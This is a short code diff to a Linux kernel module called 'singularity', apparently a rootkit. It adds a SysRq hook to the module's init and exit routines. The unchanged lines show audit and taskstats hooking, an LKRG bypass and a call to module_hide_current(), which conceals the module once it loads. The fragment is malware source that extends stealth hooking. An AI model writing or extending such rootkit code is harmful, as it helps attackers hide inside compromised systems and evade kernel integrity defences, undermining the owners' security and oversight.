@@ -16,6 +16,7 @@
 #include "include/audit.h"
 #include "include/task.h"
 #include "include/lkrg_bypass.h"
+#include "include/sysrq_hook.h"
 
 static int __init singularity_init(void) {
     int ret = 0;
@@ -35,6 +36,7 @@ static int __init singularity_init(void) {
     ret |= trace_pid_init();
     ret |= hooking_audit_init();
     ret |= taskstats_hook_init();
+    ret |= sysrq_hook_init();
     module_hide_current();
     return ret;
 }
@@ -56,6 +58,7 @@ static void __exit singularity_exit(void) {
     hooking_audit_exit();
     taskstats_hook_exit();
     lkrg_bypass_exit();
+    sysrq_hook_exit();
 }
 
 module_init(singularity_init);
